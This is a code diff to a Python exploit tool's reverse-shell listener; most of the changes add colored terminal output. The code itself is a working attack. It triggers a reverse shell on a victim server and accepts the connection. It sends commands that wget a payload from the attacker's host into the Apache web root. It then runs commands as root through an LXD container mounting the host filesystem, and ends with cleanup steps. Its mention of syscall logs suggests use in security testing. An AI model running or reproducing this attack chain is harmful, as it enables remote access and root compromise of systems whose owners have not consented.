@@ -5,26 +5,37 @@ import threading
 # I utilized as base code for this listener the code found on:
 # https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html
 
+class color:
+	PURPLE = '\033[1;35;48m'
+	CYAN = '\033[1;36;48m'
+	BOLD = '\033[1;37;48m'
+	BLUE = '\033[1;34;48m'
+	GREEN = '\033[1;32;48m'
+	YELLOW = '\033[1;33;48m'
+	RED = '\033[1;31;48m'
+	BLACK = '\033[1;30;48m'
+	UNDERLINE = '\033[4;37;48m'
+	END = '\033[1;37;0m'
+
 def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((ip, port))
 	s.listen(1)
-	print("Listening on port " + str(port))
+	print(color.GREEN + '[+]' + color.END + " Listening on port " + str(port))
 	con = None
 	conn, addr = s.accept()
-	print('Connection received from ',addr)
+	print(color.GREEN + '[+]' + color.END + ' Connection received from ',addr)
 	
 	# Dont print Banner if in repeat mode
 	if arguments.repeat == None:
-		print('=================================================')
-		print('=                Reverse Shell                  =')
-		print('=================================================')
-		print('$', end=" ") # The shell does not print the first $, so in order not to confuse the user I decided to print it
+		print(color.CYAN + '=================================================' + color.END)
+		print(color.CYAN + '=                Reverse Shell                  =' + color.END)
+		print(color.CYAN + '=================================================' + color.END)
 	try:
 		
 		t2.start() # This threads will be daemon, however they will close once the main thread closes, so we don't run into the problem of keeping it always on
-		print('[+] Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
-		print('[+] Waiting for connection')
+		print(color.GREEN + '[+]' + color.END + ' Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
+		print(color.GREEN + '[+]' + color.END + ' Waiting for connection')
 		time.sleep(0.5)
 		
 		if general_info['active'] == 'True':
@@ -33,7 +44,7 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 			except requests.exceptions.ReadTimeout:
 			    		pass
 			except requests.exceptions.ConnectTimeout:
-			    	sys.exit('[-] Failed to connect to Logging server')
+			    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
 			
 		commands = ['''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')
 ''','wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
@@ -43,18 +54,17 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 			sys.stdout.write(ans)
 			conn.send(cmd.encode())
 			time.sleep(0.2)
-			sys.stdout.write("\033[A" + ans.split("\n")[-1])
 			
 		# Dont print Banner if on repeat mode
 		if arguments.repeat == None:
-			print('''
+			print(color.CYAN + '''
 			
 			################################################################
 			#							       #
 			#                       Explanation			       #
 			#							       #
 			################################################################
-			
+			'''+color.END+ color.BOLD + '''
 			In order to have the concept of session, make compound commands.
 			Example, if you wanted to list the contents of /tmp
 			cd /tmp && ls -la
@@ -64,16 +74,19 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 			ls -la
 			
 			It will list the contents of directory you were when executing cd /tmp
-			''')
+			''' + color.END)
 		
 		# If on repeat mode, just execute some commands and exit
 		# otherwise allow the user to mess around with terminal
 		if arguments.repeat == None:
 			while True:
 				#Receive data from the target and get user input
-
+				print("", flush=True, end="")
+				conn.settimeout(1)
 				ans = recvall(conn)
-				sys.stdout.write(ans)
+				conn.settimeout(None)
+				sys.stdout.write(color.BOLD + ans + color.END)
+				print("", flush=True, end="")
 				command = input()
 
 				# Send command with 'lxc exec privesc -- sh -c "cd /mnt/root"', in order to execute the command inside the container
@@ -88,7 +101,7 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 				conn.send(command.encode())
 				time.sleep(0.4)
 				sys.stdout.write("\033[A" + ans.split("\n")[-1])
-				print("")
+				print("", flush=True)
 		else:
 			# Do some random commands while root on the lxc container
 			time.sleep(0.5)
@@ -98,18 +111,18 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 				command =  "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + cmd
 				conn.send(command.encode())
 				time.sleep(0.3)
-			print('\n[-] Unbinding...')
+			print(color.YELLOW + '\n[-]' + color.END + ' Unbinding...')
 			# Cleanup
 			if rep == 0:
 				cleanup(conn, file_name, general_info, rep)
 			time.sleep(0.2)
 			s.close()
-			print('[*] Ended exploit')
+			print(color.GREEN + '[*]' + color.END + ' Ended exploit')
 				
 			
 	except KeyboardInterrupt:
 		if conn:
-			print('\n[-] Unbinding...')
+			print(color.YELLOW + '\n[-]' + color.END + ' Unbinding...')
 			# Cleanup
 			cleanup(conn, file_name, general_info, rep)
 			time.sleep(0.2)
@@ -142,12 +155,12 @@ def task(v_ip, v_port, s=''):
 
 	time.sleep(1)
 	now = datetime.datetime.now()
-	print('[*] Executing Thread for HTTP Request')
+	print(color.GREEN + '[*]' + color.END + ' Executing Thread for HTTP Request')
 	if os.path.exists('./tmp_file_with_dest_url.txt'):
 		f = open('./tmp_file_with_dest_url.txt', 'r')
 		url = 'http' + s + '://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
 		f.close()
-		print('[*] Making request to execute reverse shell ', url)
+		print(color.GREEN + '[*]' + color.END + ' Making request to execute reverse shell ', url)
 		# Make the timeout very low in order not to wait for response
 		# Make the exception pass so that the user does not get an error 
 		try:
@@ -155,16 +168,16 @@ def task(v_ip, v_port, s=''):
 		except requests.exceptions.ReadTimeout:
 	    		pass
 		except requests.exceptions.ConnectTimeout:
-	    		sys.exit('[-] We couldn\'t find the exploit in the victim server, check if the server is alive')
+	    		sys.exit(color.RED + '[-] We couldn\'t find the exploit in the victim server, check if the server is alive' + color.END)
 	    		 
 		os.remove('./tmp_file_with_dest_url.txt')
-		print('[*] The exact time before lauching the exploit was: ', now)
-		print('[*] You can use this time to help you filter the syscall logs')
+		print(color.GREEN + '[*]' + color.END + ' The exact time before lauching the exploit was: ', now)
+		print(color.GREEN + '[*]' + color.END + ' You can use this time to help you filter the syscall logs')
 		
 
 	else:
-		print('[-] URL wasn\'t generated, you might need to run the exploit another time')
-		print('[-] If the problem persists, please confirm the information you passed')
+		print(color.RED + '[-]' + color.END + ' URL wasn\'t generated, you might need to run the exploit another time')
+		print(color.RED + '[-]' + color.END + ' If the problem persists, please confirm the information you passed')
 		
 		sys.exit()
 		
@@ -212,14 +225,14 @@ def recvall(sock):
 
 
 def cleanup(conn, file_name, general_info, rep):
-	conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force;'.encode())
+	conn.send('rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;'.encode())
 	if general_info['active'] == 'True':
 		try:
 			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
 		except requests.exceptions.ReadTimeout:
 		    		pass
 		except requests.exceptions.ConnectTimeout:
-		    	sys.exit('[-] Failed to connect to Logging server')
+		    	sys.exit(color.RED + '[-]' + color.END + ' Failed to connect to Logging server')
 
 	# Only delete local files if it's the last repetition
 	# That way we avoid downloading k times the required software
